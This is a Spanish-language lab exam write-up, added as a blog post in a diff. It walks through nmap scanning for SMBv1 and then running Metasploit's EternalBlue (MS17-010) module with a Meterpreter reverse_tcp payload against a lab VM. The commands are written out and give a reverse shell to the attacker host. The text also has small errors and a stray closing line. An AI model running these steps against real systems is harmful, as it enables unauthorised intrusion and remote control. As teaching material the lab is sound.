@@ -1,0 +1,105 @@
+---
+title: EXAMEN PARCIAL
+date: 2024-03-11 18:10:00 -05:00
+categories: [Reconnaisance, Kill Chain, Pentesting]
+tags: [nmap, kali, metasploit]  # TAG names should always be lowercase
+---
+
+
+# RESOLUCION DE EXAMEN PARCIAL
+
+para iniciar con nuestro laboratorio tenemos que :
+para nuestra maquina kalilinux: 10.0.2.9
+para nuestra maquina metasploit: 10.0.2.4
+![virtual](/assets/images/virtual.png)
+
+con ello podremos realizar nuestro primer paso:
+
+1. Utiliza Nmap desde tu máquina atacante para descubrir servicios activos en la máquina objetivo. Debes identificar los puertos relacionados con SMB y verificar si SMBv1 está habilitado.
+```bash 
+        nmap -sV -p- -oA smb_scan 10.0.2.4.
+```
+
+
+donde:
+- -sV: Realiza una detección de versión de los servicios.
+- -p-: Escanea todos los puertos, del 1 al 65535.
+- -oA smb_scan: Guarda los resultados del escaneo en archivos con el prefijo 
+"smb_scan".
+- 10.0.2.4: es la IP de nuestra victima.
+
+![dos](/assets/images/dos.png)
+
+ 
+obteniendo como respuesta la siguiente imagen:
+![tres][def]
+
+[def]: /assets/images/tres.png
+
+por lo que averiguo un poco mas sobre el SMBv1 y ejecuto este otro comando:
+```bash 
+        nmap -p 139,445 --script=smb-protocols <10.0.2.4>
+```
+explicando un poco a lo averiguado:
+- los puertos 139 y 445 son los puertos asociados con el servicio SMB.
+- El flag --script=smb-protocols indica a Nmap que utilice el script "smb-protocols" para enumerar los protocolos SMB habilitados en el servidor.
+- Al analizar la salida del comando, busco específicamente el término "SMBv1" o "NT LM 0.12" en la lista de protocolos SMB detectados.
+- Si veo una línea que indica "SMBv1: Enabled" o "NT LM 0.12: Supported", entonces puedo confirmar que el servicio SMBv1 está habilitado en el servidor objetivo.
+
+gracias a la ayuda del tip brindado, y obtengo la siguiente respuesta:
+![cuatri](/assets/images/cuatro.png)
+
+explicando un poco mas lo encontrado respecto al comando de nmap en los puertos 139,445. Segun lo que muestra estos puertos estan abiertos, el puerto 139/tcp es un servicio netbios -ssn, el puerto 445/tcp es un servicio microsoft-ds y estos puertos estan asociados con el servicio SMB.
+
+smb-protocols fue utilizado para enumerar los protocolos SMB habilitados, el resultado muestra que el protocolo NT LM 0.12 o SMBv1 esta presente, y se lo describe como peligroso pero esta como predeterminado. Esto indica que el servidor tiene habilitado el servicio SMBv1 que en un principio se habia habilitado segun las indicaciones del docente. Algo adicional que se podria indicar es que el escaneo se completo en 0.22 segundos.
+
+2. segun los resultados del escaneo con NMAP, el servidor objetivo tiene habilitado el servicio SMBv1, lo cual lo hace vulnerable a diversos ataques, entre ellos el exploit eternalBlue MS17-010.
+
+* segun su tip, para explotar esta vulnerabilidad utilizaremos el framework metasploit y seleccionare el modulo:
+```bash 
+        exploit/windows/smb/ms17_010_eternalblue
+```
+## pasos
+ para ejecutar el modulo entraremos primero a metasploit con el comando 
+ ```bash 
+        msfconsole -q
+```
+
+luego usaremos el modulo:
+```bash 
+        use exploit/windows/smb/ms17_010_eternalblue
+```
+donde configuraremos los parametros necesarios para el exploit, por ejemplo:
+- set RHOSTS 10.0.2.4
+- set LHOST 10.0.2.9
+- set RPORT 445
+
+![cinco](/assets/images/cinco.png)
+
+![seis](/assets/images/seis.png)
+
+explicando un poco lo que se ha realizado, es que este modulo aprovecha la vulnerabilidad CVE-2017-0143, conocida como EternalBlue, que afecta a la implementacion del protocolo SMBv1 en sistemas Windows. Esta vulnerabilidad permite ejecutar el codigo arbitrario en el sistema objetivo a traves de un desbordamiento de bufer en el procesamiento de paquetes SMB maliciosos.
+
+Al ejecutar este modulo, metasploit enviara los payloads SMB necesarios para explotar esta vulnerabilidad y establecer una conexion de reverse shell desde el sistema objetivo hacia nuestra maquina atacante. Esto permitira obtener acceso remoto y control sobre el sistema objetivo.
+
+![siete](/assets/images/siete.png)
+
+segun la respuesta de este modulo se puede apreciar que metasploit identifica que el servidor objetivo 10.0.2.4 es vulnerable a MS17-010 EternalBlue, que afecta a windows.
+se establece una conexion con el servidor objetivo para realizar la explotacion, una vez realizada esta conexion se procede a un volcado del bufer de memoria cruda del servidor, se envian los payload SMB maliciosos para explotar la vulnerabilidad. 
+La expotacion se completa con exito, indicado por la salida ETERNALBLUE overwrite completed successfully, posterior a ello se envia una señal de control a la conexion corrupta. 
+
+adicionalmente indico un tip el cual era realizar un payload, este "windows/x64/meterpreter/reverse_tcp", nos permite obtener una seseion de meterpreter despues de que el exploit sea ejecutado con exito. Este establecere una conexion de reverse shell.
+
+![ocho](/assets/images/ocho.png)
+
+una vez generado este exploit procedo a documentar primero la sesion meterpreter en la maquina victima si el ataque es exitoso.
+
+![nueve](/assets/images/nueve.png)
+
+para mi caso el mensaje de salida de metasploid indica que, METERPRETER SESION 2 OPENEDED 10.0.2.9:4444   10.0.2.4:49279  2024-11-03 a las 16:25:03 -8
+
+
+![nueve](/assets/images/nueve.png)
+
+esto confirmaria que la explotacion fue exitosa y se establecio una sesion de meterpreter en la maquina atacante y el servidor objetivo.
+sdsd
